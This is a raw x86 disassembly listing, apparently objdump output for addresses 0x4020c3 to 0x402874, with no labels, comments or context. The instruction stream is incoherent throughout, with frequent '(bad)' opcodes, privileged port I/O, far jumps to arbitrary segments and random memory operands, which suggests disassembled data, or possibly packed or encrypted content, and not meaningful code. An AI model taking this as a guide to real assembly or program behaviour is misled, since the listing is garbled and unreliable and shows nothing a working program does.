  4020c3:	jns    0x4020a6
  4020c5:	out    dx,eax
  4020c6:	mov    al,0xcf
  4020c8:	jg     0x40211b
  4020ca:	mov    bh,BYTE PTR [esi+0x2dc2fc11]
  4020d0:	aad    0x57
  4020d2:	adc    edi,esi
  4020d4:	out    dx,eax
  4020d5:	cdq    
  4020d6:	(bad)  
  4020d7:	clc    
  4020d8:	sbb    DWORD PTR [edi+0x395593dc],esi
  4020de:	push   edx
  4020df:	cmp    eax,0x39eb0a6a
  4020e4:	inc    edi
  4020e5:	(bad)  
  4020e6:	ds push ds
  4020e8:	loopne 0x4020cb
  4020ea:	or     ebx,edi
  4020ec:	sub    BYTE PTR [eax+ecx*2],ah
  4020ef:	inc    edx
  4020f0:	mov    esi,0x4c3c7381
  4020f5:	test   al,0x53
  4020f7:	loope  0x40211b
  4020f9:	nop
  4020fa:	stos   DWORD PTR es:[edi],eax
  4020fb:	push   edx
  4020fc:	aam    0x5a
  4020fe:	mov    eax,ds:0xa8314a72
  402103:	retf   0x72c7
  402106:	jmp    0x7d43fe27
  40210b:	push   0x3a
  40210d:	or     BYTE PTR [ebp+0xa],al
  402110:	mov    ebp,ecx
  402112:	shl    DWORD PTR [ecx+0x7],1
  402115:	idiv   dh
  402117:	push   eax
  402118:	or     al,0xbf
  40211a:	int    0x37
  40211c:	cmp    eax,0x39d2dffd
  402121:	push   ss
  402122:	ins    BYTE PTR es:[edi],dx
  402123:	dec    edi
  402124:	ja     0x402173
  402126:	js     0x402128
  402128:	mov    dl,0xd7
  40212a:	and    edx,DWORD PTR [edx-0x24105db7]
  402130:	retf   
  402131:	mov    ch,0xdd
  402133:	xchg   ebp,eax
  402134:	lea    esi,ds:0x85158f88
  40213a:	test   al,0x86
  40213c:	xchg   ebx,eax
  40213d:	(bad)  
  40213e:	dec    eax
  40213f:	jge    0x40217e
  402141:	mov    bl,0x86
  402143:	leave  
  402144:	inc    edx
  402145:	pop    esp
  402146:	mov    BYTE PTR [edi],bh
  402148:	push   DWORD PTR [ebp-0x41e1b75b]
  40214e:	jne    0x4020fa
  402150:	aam    0xd2
  402152:	inc    esp
  402153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402154:	into   
  402155:	and    edi,DWORD PTR [ecx]
  402157:	jo     0x402168
  402159:	aam    0xe9
  40215b:	push   es
  40215c:	in     al,dx
  40215d:	scas   eax,DWORD PTR es:[edi]
  40215e:	lock jnp 0x4021c6
  402161:	stos   DWORD PTR es:[edi],eax
  402162:	cmp    ecx,esp
  402164:	and    DWORD PTR [edx+0x3],ebx
  402167:	fst    QWORD PTR [edx-0x78d4dd34]
  40216d:	mov    ds:0x531765ae,al
  402172:	icebp  
  402173:	mov    bl,0xb
  402175:	stos   BYTE PTR es:[edi],al
  402176:	out    dx,al
  402177:	ins    BYTE PTR es:[edi],dx
  402178:	pop    eax
  402179:	cmp    al,0xbc
  40217b:	loope  0x402185
  40217d:	loopne 0x4021fc
  40217f:	jl     0x402177
  402181:	mov    esi,0x8e4c9afd
  402186:	(bad)
  40218a:	push   edx
  40218b:	inc    edi
  40218c:	cmc    
  40218d:	jmp    0x88c1:0x58c2340f
  402194:	xlat   BYTE PTR ds:[ebx]
  402195:	xor    eax,DWORD PTR [ecx]
  402197:	pop    eax
  402198:	and    DWORD PTR [edi+0x5a],esp
  40219b:	inc    esp
  40219c:	lods   al,BYTE PTR ds:[esi]
  40219d:	stc    
  40219e:	xor    ah,BYTE PTR [edi+0x5]
  4021a1:	xchg   edx,eax
  4021a2:	pop    esi
  4021a3:	mov    eax,ds:0x7d2c5878
  4021a8:	mov    fs,WORD PTR [ebx]
  4021aa:	into   
  4021ab:	scas   al,BYTE PTR es:[edi]
  4021ac:	add    bl,al
  4021ae:	es push ebx
  4021b0:	(bad)  
  4021b1:	push   ebp
  4021b2:	bound  edx,QWORD PTR [ecx+ebx*4+0x78]
  4021b6:	push   ebx
  4021b7:	test   eax,0xfc3bce80
  4021bc:	sbb    esp,edi
  4021be:	xchg   ecx,eax
  4021bf:	out    0xb1,al
  4021c1:	push   0xffffffb4
  4021c3:	pop    edx
  4021c4:	(bad)  
  4021c5:	sbb    al,0xf5
  4021c7:	cld    
  4021c8:	xor    al,0xfe
  4021ca:	dec    esp
  4021cb:	popf   
  4021cc:	jg     0x402173
  4021ce:	in     al,dx
  4021cf:	dec    eax
  4021d0:	cld    
  4021d1:	inc    ecx
  4021d2:	sub    ebx,edx
  4021d4:	and    ebx,DWORD PTR [eax-0x38df5c7a]
  4021da:	add    bl,bh
  4021dc:	(bad)  
  4021dd:	test   eax,0x1bd048e5
  4021e2:	loop   0x402253
  4021e4:	les    esi,FWORD PTR [ebp+0x37]
  4021e7:	jno    0x40216e
  4021e9:	jg     0x40226a
  4021eb:	xor    ebp,DWORD PTR ds:0x228be077
  4021f1:	ins    BYTE PTR es:[edi],dx
  4021f2:	out    0x4a,al
  4021f4:	je     0x402217
  4021f6:	leave  
  4021f7:	sub    esi,eax
  4021f9:	rcr    DWORD PTR [edi],1
  4021fb:	enter  0xd92,0x2
  4021ff:	mov    dh,0x45
  402201:	cmp    bl,BYTE PTR ds:0x95f1a27f
  402207:	add    BYTE PTR [ebx+0x62],ah
  40220a:	sar    BYTE PTR [edx-0x30a6526b],cl
  402210:	out    dx,eax
  402211:	data16 mov BYTE PTR [edx],cl
  402214:	lods   eax,DWORD PTR ds:[esi]
  402215:	xchg   DWORD PTR [ebp-0x5d],ebp
  402218:	sub    eax,0xfc7f71e6
  40221d:	pop    ss
  40221e:	arpl   WORD PTR [eax+0x18],dx
  402221:	push   ebp
  402222:	repz sbb ah,BYTE PTR [ebx]
  402225:	pop    edi
  402226:	bound  edi,QWORD PTR [eax-0x70b13092]
  40222c:	dec    ebx
  40222d:	test   DWORD PTR ds:0xc500eb63,ecx
  402233:	and    al,0x4d
  402235:	int3   
  402236:	mov    ebx,0xe1c4016a
  40223b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40223c:	out    dx,eax
  40223d:	pop    eax
  40223e:	ficomp DWORD PTR [ecx-0x40]
  402241:	dec    edx
  402242:	dec    esi
  402243:	pushf  
  402244:	fwait
  402245:	out    0x57,eax
  402247:	call   0x4fdd6663
  40224c:	push   esp
  40224d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40224e:	rcr    BYTE PTR ds:0x844a5ba9,1
  402254:	pop    ebp
  402255:	add    ah,ch
  402257:	cli    
  402258:	add    DWORD PTR [esi+0x3f18e4cb],esp
  40225e:	(bad)  
  40225f:	into   
  402260:	sbb    esp,eax
  402262:	cmp    al,bh
  402264:	sub    al,0xf5
  402266:	popa   
  402267:	cdq    
  402268:	dec    esi
  402269:	fld    TBYTE PTR [ebx+0x32]
  40226c:	dec    ebx
  40226d:	jno    0x4022e7
  40226f:	pop    edx
  402270:	fadd   DWORD PTR [esi-0x530aaf40]
  402276:	dec    ebp
  402277:	or     dh,BYTE PTR [edx-0x16]
  40227a:	inc    ebp
  40227b:	stc    
  40227c:	fist   DWORD PTR [ebp+0x7b01208b]
  402282:	enter  0x5a85,0xf3
  402286:	jp     0x40223e
  402288:	clc    
  402289:	pop    es
  40228a:	mov    ebp,0x316be110
  40228f:	sbb    esi,DWORD PTR [ecx+0x1bbad32]
  402295:	retf   
  402296:	inc    edi
  402297:	aaa    
  402298:	icebp  
  402299:	addr16 js 0x4022e2
  40229c:	aad    0x96
  40229e:	sbb    edi,ecx
  4022a0:	add    DWORD PTR [ebx],ecx
  4022a2:	and    DWORD PTR [esi-0x1df4abfd],0x71b47e50
  4022ac:	iret   
  4022ad:	add    BYTE PTR [esi-0x6a],dh
  4022b0:	hlt    
  4022b1:	test   eax,0xe5b3ea78
  4022b6:	data16 and al,0xb8
  4022b9:	leave  
  4022ba:	retf   0x322e
  4022bd:	mov    bh,0x55
  4022bf:	sub    eax,DWORD PTR [esp+edi*4]
  4022c2:	push   cs
  4022c3:	or     eax,0xe425ec4d
  4022c8:	jle    0x4022ee
  4022ca:	retf   0xae4e
  4022cd:	mov    dl,0x46
  4022cf:	xlat   BYTE PTR ds:[ebx]
  4022d0:	fs dec eax
  4022d2:	mov    ch,BYTE PTR [ecx-0xc]
  4022d5:	fs push cs
  4022d7:	aam    0xb8
  4022d9:	add    edi,edx
  4022db:	mov    al,ds:0xee546613
  4022e0:	add    edi,DWORD PTR [ecx]
  4022e2:	xor    bl,0xfd
  4022e5:	mov    al,ds:0x7f2d27f5
  4022ea:	cld    
  4022eb:	aas    
  4022ec:	stos   DWORD PTR es:[edi],eax
  4022ed:	imul   edx,edi,0x2e
  4022f0:	xchg   edx,eax
  4022f1:	mov    bh,0x59
  4022f3:	aam    0xfe
  4022f5:	neg    DWORD PTR [edi+0x705921de]
  4022fb:	xor    eax,0x2046b68b
  402300:	cmp    ch,BYTE PTR [eax]
  402302:	ja     0x402358
  402304:	jmp    0x40234a
  402306:	popf   
  402307:	fwait
  402308:	xlat   BYTE PTR ds:[ebx]
  402309:	lock pop esp
  40230b:	mov    WORD PTR [esi-0x24db8f89],ds
  402311:	stos   DWORD PTR es:[edi],eax
  402312:	retf   0x9ee7
  402315:	ret    0xa590
  402318:	(bad)  
  402319:	cmp    DWORD PTR [ebp-0x720e6a8f],ebx
  40231f:	sub    eax,0xeab6f397
  402324:	push   0xffffffaf
  402326:	sub    DWORD PTR [ecx],ecx
  402328:	xchg   edi,eax
  402329:	iret   
  40232a:	data16 jl 0x4022d2
  40232d:	popa   
  40232e:	fs inc eax
  402330:	inc    ebp
  402331:	pushf  
  402332:	loope  0x40232b
  402334:	cmp    al,0xb7
  402337:	add    dl,BYTE PTR [eax-0x80]
  40233a:	(bad)  
  40233c:	xchg   BYTE PTR [ebx+0x5964ca1a],al
  402342:	out    dx,al
  402343:	push   es
  402344:	mov    al,0xb8
  402346:	pop    es
  402347:	fidiv  WORD PTR [ebp+0x2]
  40234a:	fist   DWORD PTR [edi+0x3f043a0d]
  402351:	stos   DWORD PTR es:[edi],eax
  402352:	lahf   
  402353:	xchg   BYTE PTR [edi+0x22dd999f],bl
  402359:	lahf   
  40235a:	push   DWORD PTR [eax]
  40235c:	(bad)  
  40235d:	lds    eax,FWORD PTR [ebx+0x6b697ee4]
  402363:	adc    eax,0x838ef332
  402368:	imul   ebp,DWORD PTR [edi],0xc5235921
  40236e:	adc    BYTE PTR ds:0x79d4f6bd,bl
  402374:	or     eax,0xf99185c0
  402379:	xchg   edx,eax
  40237a:	pop    eax
  40237b:	xlat   BYTE PTR ds:[ebx]
  40237c:	mov    esp,0x710047a1
  402381:	xor    eax,DWORD PTR [eax]
  402383:	sbb    edi,0x6827b49d
  402389:	scas   eax,DWORD PTR es:[edi]
  40238a:	(bad)  
  40238b:	call   0x4a7c24a3
  402390:	xchg   esp,eax
  402391:	inc    esp
  402392:	mov    dh,0xf0
  402394:	mov    DWORD PTR [ebx-0x9],esp
  402397:	test   BYTE PTR [edx],dh
  402399:	inc    edi
  40239a:	mov    ecx,0x87fb1d4f
  40239f:	fs mov bh,0x9e
  4023a2:	jae    0x40234a
  4023a4:	xchg   esi,eax
  4023a5:	idiv   ebx
  4023a7:	repnz push ebx
  4023a9:	fnstsw WORD PTR [esp+eiz*2]
  4023ac:	push   esi
  4023ad:	mov    ds:0xc148f030,eax
  4023b2:	sub    DWORD PTR [eax+eax*4],0xe26def87
  4023b9:	push   ebp
  4023ba:	xor    eax,0xb5775528
  4023bf:	adc    esp,ebp
  4023c1:	fisubr WORD PTR ds:0xf5d32af9
  4023c7:	or     al,0x32
  4023c9:	adc    BYTE PTR [ebx+0x751611e2],ah
  4023cf:	rcr    DWORD PTR [eax],cl
  4023d1:	fadd   DWORD PTR [esi-0x20]
  4023d4:	daa    
  4023d5:	sub    al,0xbf
  4023d7:	dec    edi
  4023d8:	or     ch,BYTE PTR [esi-0x539d7984]
  4023de:	and    BYTE PTR [edx],cl
  4023e0:	pop    ebx
  4023e1:	or     al,0xe7
  4023e3:	ss (bad) 
  4023e5:	ss jg  0x4023d1
  4023e8:	leave  
  4023e9:	test   eax,0xef20f52d
  4023ee:	call   FWORD PTR [eax-0x5a53181f]
  4023f4:	ins    BYTE PTR es:[edi],dx
  4023f5:	jge    0x40240c
  4023f7:	mov    al,0xec
  4023f9:	fist   WORD PTR [esi-0x6e]
  4023fc:	inc    esp
  4023fd:	pop    edi
  4023fe:	xor    BYTE PTR [ebp+0x66],bh
  402401:	sbb    DWORD PTR [ebp+0x3b697453],0xb
  402408:	je     0x4023f7
  40240a:	les    edx,FWORD PTR [ecx]
  40240c:	adc    dh,ah
  40240e:	pushf  
  40240f:	mov    bl,BYTE PTR [ebx+0x65]
  402412:	jae    0x4023c5
  402414:	cs jno 0x402451
  402417:	mov    dl,0x23
  402419:	cmp    dh,BYTE PTR [ebp+0x139612af]
  40241f:	xor    al,0x47
  402421:	sub    al,0x1
  402423:	sti    
  402424:	scas   eax,DWORD PTR es:[edi]
  402425:	bound  ebp,QWORD PTR [ecx+0x53314e4e]
  40242b:	cmp    eax,0x6b7dd6b
  402430:	xchg   ebx,eax
  402431:	adc    eax,0x391c7133
  402436:	aas    
  402437:	pop    esi
  402438:	pop    ecx
  402439:	fist   DWORD PTR [eax-0x6b]
  40243c:	pop    eax
  40243d:	and    eax,0x28bdff22
  402442:	mov    esi,0xf02c322d
  402447:	out    0x88,al
  402449:	aam    0x44
  40244b:	xchg   DWORD PTR [edx+ebx*2-0x45],ebp
  40244f:	sub    bl,BYTE PTR ds:0xdd76fa29
  402455:	mov    dl,0x11
  402457:	add    BYTE PTR ds:0x82686df2,0xa9
  40245e:	jle    0x40242f
  402460:	(bad)  
  402461:	int    0x97
  402463:	add    DWORD PTR [edx+0x45308bfd],eax
  402469:	out    0x9c,al
  40246b:	adc    ch,BYTE PTR [eax+ebx*8-0x2c022c91]
  402472:	lods   eax,DWORD PTR ds:[esi]
  402473:	in     al,dx
  402474:	mov    dh,0x38
  402476:	xchg   edx,eax
  402477:	popf   
  402478:	mov    ah,al
  40247a:	and    eax,0xe94bdc29
  40247f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402480:	mul    eax
  402482:	mov    ebp,0x764e039b
  402487:	dec    esp
  402488:	clc    
  402489:	adc    eax,0xfbf7f261
  40248e:	xchg   edi,eax
  40248f:	iret   
  402490:	pop    ds
  402491:	dec    ecx
  402492:	popf   
  402493:	and    dl,bh
  402495:	sbb    DWORD PTR [edi-0x68],edx
  402498:	pop    esp
  402499:	addr16 hlt 
  40249b:	inc    esp
  40249c:	stos   DWORD PTR es:[edi],eax
  40249d:	into   
  40249e:	push   ebx
  40249f:	scas   eax,DWORD PTR es:[edi]
  4024a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024a1:	push   ebp
  4024a2:	int    0xc1
  4024a4:	shl    DWORD PTR [ecx+0xf],1
  4024a7:	jno    0x40245b
  4024a9:	push   ebp
  4024aa:	add    esi,esp
  4024ac:	inc    esi
  4024ad:	nop
  4024ae:	jbe    0x4024d6
  4024b0:	push   es
  4024b1:	sbb    eax,0xf12187e2
  4024b6:	sub    edi,DWORD PTR [ecx+0x17]
  4024b9:	adc    al,0xe8
  4024bb:	mov    bl,0x4f
  4024bd:	push   edx
  4024be:	(bad)  
  4024bf:	and    eax,0x81638ebe
  4024c4:	jnp    0x4024ad
  4024c6:	mov    bl,BYTE PTR [edi+0x59]
  4024c9:	cmp    ebp,DWORD PTR [edx-0x200f58b1]
  4024cf:	pop    ebx
  4024d0:	pop    ecx
  4024d1:	and    dh,BYTE PTR [edx-0x1f]
  4024d4:	fld    st(0)
  4024d6:	jo     0x40253a
  4024d8:	icebp  
  4024d9:	out    dx,al
  4024da:	and    eax,0x23e7543b
  4024df:	add    BYTE PTR [edi-0x2b],bh
  4024e2:	cmp    esi,eax
  4024e4:	pop    ebp
  4024e5:	dec    edi
  4024e6:	or     eax,0x7a7e0c1c
  4024eb:	xchg   edx,eax
  4024ec:	fcom   QWORD PTR [edi+0x1c]
  4024ef:	push   ecx
  4024f0:	fwait
  4024f1:	sti    
  4024f2:	(bad)  
  4024f3:	pop    esp
  4024f4:	pop    es
  4024f5:	imul   esp,ebp,0x55
  4024f8:	jo     0x40252c
  4024fa:	aaa    
  4024fb:	lahf   
  4024fc:	mov    bh,0x4c
  4024fe:	pop    ds
  4024ff:	not    DWORD PTR [edi+0x7e3f4c17]
  402505:	or     ch,al
  402507:	dec    ebp
  402508:	pop    DWORD PTR [ecx]
  40250a:	sbb    ecx,DWORD PTR [ecx+0x9efbe66]
  402510:	xor    DWORD PTR [ebp+ecx*8-0x723cbd60],edi
  402517:	pop    es
  402518:	retf   0xd452
  40251b:	shl    DWORD PTR [ebx],0xb8
  40251e:	in     al,0xb9
  402520:	add    esi,DWORD PTR [eax-0x18]
  402523:	ins    DWORD PTR es:[edi],dx
  402524:	dec    eax
  402525:	sbb    DWORD PTR [ecx],edx
  402527:	jae    0x4024dc
  402529:	out    0x60,eax
  40252b:	inc    edi
  40252c:	ja     0x4025a9
  40252e:	fistp  WORD PTR cs:[ecx]
  402531:	pop    esp
  402532:	push   eax
  402533:	loopne 0x40257e
  402535:	xor    ebp,DWORD PTR [edi-0xd]
  402538:	mov    bl,0xb8
  40253a:	pop    ebx
  40253b:	mov    edx,0xd5d8cf29
  402540:	cmp    eax,0x28fc2ddd
  402545:	sub    DWORD PTR [edx],ecx
  402547:	sbb    eax,DWORD PTR [edi+0x44]
  40254a:	mov    dl,0xcf
  40254c:	add    eax,0x18740ad1
  402551:	push   es
  402552:	xlat   BYTE PTR ds:[ebx]
  402553:	ficomp WORD PTR [edx+0x1e]
  402556:	lahf   
  402557:	xor    BYTE PTR [eax],dl
  402559:	xor    ebx,DWORD PTR [ecx+edi*8+0x4a347511]
  402560:	and    edx,DWORD PTR [edi+0x24]
  402563:	dec    esi
  402564:	adc    bl,BYTE PTR [edi-0x43]
  402567:	fs daa 
  402569:	int    0x10
  40256b:	xchg   ebx,eax
  40256c:	and    DWORD PTR [edx+ebp*4-0x36d878bc],eax
  402573:	jns    0x402576
  402575:	adc    ecx,DWORD PTR [esi-0x75]
  402578:	mov    BYTE PTR [ebp+0x35],ch
  40257b:	and    BYTE PTR [edi+0xc],cl
  40257e:	mov    edx,DWORD PTR [ecx+0x53]
  402581:	cmp    ch,BYTE PTR [ecx+ebx*4]
  402584:	adc    ecx,DWORD PTR [bp-0x50b3]
  402589:	loop   0x40256c
  40258b:	adc    cl,dl
  40258d:	inc    esp
  40258e:	sub    BYTE PTR [ebp+0xdc24edf],ch
  402594:	mov    edi,0x2c4b630b
  402599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40259a:	dec    esi
  40259b:	mov    dl,0xb8
  40259d:	lods   eax,DWORD PTR ds:[esi]
  40259e:	clc    
  40259f:	and    eax,0x3f88ee8e
  4025a4:	shr    DWORD PTR [edx],1
  4025a6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a8:	adc    al,0xf3
  4025aa:	popa   
  4025ab:	jl     0x4025d1
  4025ad:	aas    
  4025ae:	xchg   ecx,eax
  4025af:	cmp    eax,0xc9e97acf
  4025b4:	les    eax,FWORD PTR [ebx+edi*2]
  4025b7:	jns    0x4025b3
  4025b9:	sbb    esp,ecx
  4025bb:	mov    cs,WORD PTR [esi+0x5a]
  4025be:	icebp  
  4025bf:	mov    ah,BYTE PTR es:[ebx-0x8]
  4025c3:	xchg   esi,eax
  4025c4:	popf   
  4025c5:	xor    eax,0x8860734c
  4025ca:	rcl    BYTE PTR [edx+0x5050ac48],1
  4025d0:	stos   BYTE PTR es:[edi],al
  4025d1:	(bad)  
  4025d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025d4:	aas    
  4025d5:	pop    eax
  4025d6:	sub    edi,DWORD PTR es:[ebx]
  4025d9:	jmp    0x4025a5
  4025db:	fimul  DWORD PTR [esi]
  4025dd:	and    BYTE PTR [eax+edi*1-0x39],bh
  4025e1:	aam    0xc4
  4025e3:	test   dh,dh
  4025e5:	btr    esi,esi
  4025e8:	push   es
  4025e9:	sar    DWORD PTR [eax],1
  4025eb:	jecxz  0x40264c
  4025ed:	ret    
  4025ee:	inc    ecx
  4025ef:	iret   
  4025f0:	js     0x402583
  4025f2:	xor    eax,ecx
  4025f4:	iret   
  4025f5:	aas    
  4025f6:	test   dh,ch
  4025f8:	add    edi,DWORD PTR [ecx]
  4025fa:	ror    BYTE PTR [edx+0x6d089c34],cl
  402600:	adc    BYTE PTR [ebp+0x48697001],ah
  402606:	inc    esp
  402607:	outs   dx,BYTE PTR ds:[esi]
  402608:	hlt    
  402609:	data16 mov cl,0xfa
  40260c:	fcmovnbe st,st(6)
  40260e:	mov    ch,0x18
  402610:	sahf   
  402611:	in     al,dx
  402612:	leave  
  402613:	out    0xf5,al
  402615:	das    
  402616:	jg     0x4025be
  402618:	and    DWORD PTR [ecx+0x4cc38e2b],0x65e90368
  402622:	lahf   
  402623:	or     dh,BYTE PTR [eax+0x3e05eec0]
  402629:	jb     0x402627
  40262b:	cs xchg edi,eax
  40262d:	cmp    esp,DWORD PTR [eax]
  40262f:	jg     0x402682
  402631:	lea    ebx,[edx]
  402633:	ret    0xfa7d
  402636:	pop    ecx
  402637:	ds mov bl,0xba
  40263a:	leave  
  40263b:	pop    esp
  40263c:	cmp    BYTE PTR [edx-0x40],ah
  40263f:	hlt    
  402640:	jge    0x402672
  402642:	aas    
  402643:	mov    ecx,0x44c094ce
  402648:	(bad)  [ebx]
  40264a:	int3   
  40264b:	lock dec eax
  40264d:	ret    
  40264e:	rcr    ebp,1
  402650:	dec    eax
  402651:	cmp    al,0xe6
  402653:	jae    0x40263d
  402655:	mov    DWORD PTR [ecx-0x7e],esi
  402658:	xchg   esp,esi
  40265a:	add    DWORD PTR [ebp-0x251849ca],edi
  402660:	pop    esp
  402661:	jb     0x4026c9
  402663:	sbb    al,0x95
  402665:	sbb    DWORD PTR [esp+ebx*4+0x2fd9c057],edx
  40266c:	in     al,0x29
  40266e:	dec    ebp
  40266f:	dec    ebx
  402670:	int3   
  402671:	les    ebx,FWORD PTR [eax]
  402673:	cli    
  402674:	push   edx
  402675:	out    dx,al
  402676:	out    dx,eax
  402677:	mov    cl,0xec
  402679:	or     al,0xf6
  40267b:	cmp    BYTE PTR [esp+esi*2-0x46bc5579],bh
  402682:	sti    
  402683:	and    al,al
  402685:	add    BYTE PTR [edx+0x57],ah
  402688:	push   ds
  402689:	jae    0x40262f
  40268b:	loopne 0x4026b1
  40268d:	mov    ds:0x14b3714e,eax
  402692:	push   ebp
  402693:	jle    0x4026f3
  402695:	(bad)  
  402696:	fbld   TBYTE PTR [ecx+0x27025e20]
  40269c:	repnz retf 
  40269e:	es fucomip st,st(7)
  4026a2:	(bad)  
  4026a3:	sbb    DWORD PTR [edi-0x12813826],0x57459750
  4026ad:	mul    BYTE PTR [esi-0x21]
  4026b0:	or     dl,BYTE PTR [ebx+eiz*8+0x7c580572]
  4026b7:	popf   
  4026b8:	xchg   esi,eax
  4026b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ba:	daa    
  4026bb:	enter  0xeb72,0x3
  4026bf:	aas    
  4026c0:	push   edx
  4026c1:	adc    dh,ah
  4026c3:	(bad)  
  4026c4:	repz sbb DWORD PTR [edi],edx
  4026c7:	leave  
  4026c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026c9:	inc    esi
  4026ca:	push   es
  4026cb:	mov    ebx,0x7b88922e
  4026d1:	jg     0x402681
  4026d3:	mov    ds:0x6bdb52a3,eax
  4026d8:	rol    DWORD PTR [edx],1
  4026da:	pop    ss
  4026db:	inc    eax
  4026dc:	fcomp  st(4)
  4026de:	popa   
  4026df:	and    dl,BYTE PTR [ebp+edi*4+0x2ac744c9]
  4026e6:	adc    al,BYTE PTR [edi+0x10de2eac]
  4026ec:	in     al,dx
  4026ed:	sar    DWORD PTR [ecx+0x36],0xba
  4026f1:	adc    ah,cl
  4026f3:	aam    0x19
  4026f5:	das    
  4026f6:	leave  
  4026f7:	ss ds addr16 out 0x7b,al
  4026fc:	es jnp 0x40268b
  4026ff:	jbe    0x402714
  402701:	jle    0x4026f4
  402703:	dec    esi
  402704:	lods   al,BYTE PTR ds:[esi]
  402705:	popf   
  402706:	imul   eax,DWORD PTR [bx+di-0x2321],0x11
  40270c:	or     DWORD PTR [ecx],esp
  40270e:	cmp    DWORD PTR [eax-0x2c9578bd],edi
  402714:	cmp    al,0x89
  402716:	shl    DWORD PTR [ebx+0x5e],0x57
  40271a:	push   es
  40271b:	mov    ss,WORD PTR [edx+0x13d6b428]
  402721:	mov    ebp,0x26add317
  402726:	das    
  402727:	dec    edx
  402728:	inc    BYTE PTR [edx]
  40272a:	mov    ebx,0x422fa338
  40272f:	fwait
  402730:	mov    ds:0x8369ecad,al
  402735:	in     eax,dx
  402736:	and    esi,eax
  402738:	shl    ah,0xca
  40273b:	inc    edx
  40273c:	jecxz  0x4026fc
  40273e:	adc    BYTE PTR [ebx],dl
  402740:	ror    BYTE PTR [edx],cl
  402742:	pusha  
  402743:	jge    0x402710
  402745:	mov    ebx,0x3dbc039
  40274a:	dec    ebp
  40274b:	imul   ebp,DWORD PTR [ebx-0x3751419a],0xffffffee
  402752:	mov    cs,WORD PTR [edi+0x1e41b633]
  402758:	xor    ch,BYTE PTR [ebx+0x7ff246ab]
  40275e:	fs enter 0x4897,0x1e
  402763:	addr16 inc edi
  402765:	retf   
  402766:	sub    dl,BYTE PTR [esi]
  402768:	jmp    FWORD PTR [eax-0x32]
  40276b:	inc    eax
  40276c:	pop    ebx
  40276d:	dec    ebp
  40276e:	jno    0x4027cd
  402770:	sub    DWORD PTR [ebp+0x4ceb1c55],ebp
  402776:	test   al,0x57
  402778:	into   
  402779:	cmp    al,BYTE PTR [edx]
  40277b:	das    
  40277c:	test   eax,0xae4566e2
  402781:	scas   eax,DWORD PTR es:[edi]
  402782:	retf   
  402783:	pop    ebx
  402784:	push   ebp
  402785:	push   ecx
  402786:	pop    ebx
  402787:	fisub  DWORD PTR [esi+0x38]
  40278a:	mov    ebx,0xf139b928
  40278f:	push   cs
  402790:	push   ebx
  402791:	jb     0x4027ba
  402793:	xlat   BYTE PTR ds:[ebx]
  402794:	cwde   
  402795:	inc    ebx
  402796:	push   es
  402797:	sbb    bh,BYTE PTR ds:0x296aaa36
  40279d:	mov    cl,BYTE PTR [esi]
  40279f:	loopne 0x402727
  4027a1:	xor    esp,edi
  4027a3:	mov    fs,ebx
  4027a5:	dec    edi
  4027a6:	and    BYTE PTR [ecx+0x74],dh
  4027a9:	push   es
  4027aa:	jno    0x402791
  4027ac:	loop   0x4027f7
  4027ae:	push   esi
  4027af:	cmp    eax,0x7854399e
  4027b4:	enter  0x1dcd,0x73
  4027b8:	mov    esp,0x3299f6f6
  4027bd:	popf   
  4027be:	mov    ss:0xae1995c6,eax
  4027c4:	gs jg  0x40277f
  4027c7:	and    BYTE PTR [eax],ah
  4027c9:	scas   al,BYTE PTR es:[edi]
  4027ca:	jmp    0xe9f7:0xa372e118
  4027d1:	dec    esi
  4027d2:	sub    ecx,DWORD PTR [edx-0x5e29db0]
  4027d8:	loope  0x402780
  4027da:	jge    0x4027e9
  4027dc:	scas   eax,DWORD PTR es:[edi]
  4027dd:	aam    0x5c
  4027df:	sbb    edi,DWORD PTR [edi-0x66]
  4027e2:	scas   al,BYTE PTR es:[edi]
  4027e3:	fsubr  st(4),st
  4027e5:	jno    0x4027f9
  4027e7:	loopne 0x40280f
  4027e9:	cld    
  4027ea:	add    ch,BYTE PTR [ebx+ebx*4-0x77]
  4027ee:	or     cl,BYTE PTR [ebx-0x162418da]
  4027f4:	mov    ds:0x64d9af77,eax
  4027f9:	add    ecx,ecx
  4027fb:	cmp    DWORD PTR [ecx+0x3e],esp
  4027fe:	and    BYTE PTR [ecx-0x69340e3d],ch
  402804:	inc    ecx
  402805:	pop    eax
  402806:	lods   eax,DWORD PTR ds:[esi]
  402807:	cs daa 
  402809:	pop    eax
  40280a:	stos   DWORD PTR es:[edi],eax
  40280b:	lock fs addr16 lahf 
  40280f:	aam    0x15
  402811:	inc    esi
  402812:	cmp    al,0x62
  402814:	fcmovne st,st(7)
  402816:	icebp  
  402817:	rcl    cl,cl
  402819:	sar    BYTE PTR [edx-0x17],1
  40281c:	popa   
  40281d:	leave  
  40281e:	jmp    0xf4fc:0x798ba736
  402825:	scas   al,BYTE PTR es:[edi]
  402826:	mov    dh,0x2f
  402828:	in     eax,dx
  402829:	jne    0x402835
  40282b:	or     ch,BYTE PTR [eax+ebp*8+0x4addb700]
  402832:	mov    al,ds:0x74ef0a2d
  402837:	into   
  402838:	jbe    0x402847
  40283a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40283b:	test   BYTE PTR [ebp*8+0xe095a8d],cl
  402842:	mov    dh,BYTE PTR [ebx-0x54bf31e7]
  402848:	and    eax,0x7310096
  40284d:	pop    ebp
  40284e:	out    dx,eax
  40284f:	and    dl,BYTE PTR [eax-0x538d790]
  402855:	push   edx
  402856:	dec    ecx
  402857:	add    ebx,DWORD PTR [ebp-0x3d]
  40285a:	icebp  
  40285b:	mov    edx,0xeb39b404
  402860:	add    esi,DWORD PTR [edi+0xe]
  402863:	xchg   edx,eax
  402864:	ja     0x402849
  402866:	int3   
  402867:	sub    DWORD PTR [ebx],esp
  402869:	push   edx
  40286a:	stos   BYTE PTR es:[edi],al
  40286b:	lock leave 
  40286d:	mov    cl,BYTE PTR [esi+ebp*2+0x4cfa3227]
  402874:	cmp    BYTE PTR [ecx-0xd46dfeb],0x84
